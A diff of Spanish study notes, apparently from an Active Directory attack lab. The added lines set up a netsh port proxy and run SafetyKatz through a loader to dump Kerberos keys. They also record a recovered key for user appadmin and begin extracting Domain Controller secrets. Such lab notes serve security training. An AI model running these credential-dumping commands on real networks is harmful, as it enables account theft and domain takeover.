@@ -755,10 +755,24 @@ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.ex
 
 Haremos la redirección de puertos
 ```shell
-[student97]
+[dcorp-adminsrv]
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
 ```
 
 Y ejecutaremos el *SafetyKatz*
+```shell
+[dcorp-adminsrv]
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+```
 
+Obteniendo al credencial del usuario *appadmin -> 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb*
 
+*LO - 08*
+### Estraer secrets del Domain Controller
+Primero deberemos de ejecutar un proceso con privilegios de Domain Admin, para ello ejecutaremos una CMD con privilegios elevados
+```shell
+[student97]
+runas /user:dcorp\student97 /netonly cmd
+```
+
+Y extraeremos los 
